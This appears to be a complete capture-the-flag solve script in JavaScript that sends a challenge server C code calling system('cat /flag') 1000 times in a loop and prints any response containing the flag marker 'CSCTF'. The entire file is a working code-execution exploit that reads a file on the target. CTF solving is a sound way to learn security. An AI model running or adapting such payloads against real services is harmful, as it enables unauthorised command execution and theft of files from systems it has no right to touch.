let URL = "http://localhost:1337/"
URL = "https://43b64d26-d839-427d-92b2-68cf49cde759.bugg.cc"

for (let i = 0; i < 1000; i++) fetch(`${URL}?code=${encodeURIComponent('main() { system("cat /flag"); }')}`).then(res => res.text()).then(text => { if (text.includes('CSCTF')) console.log(text) });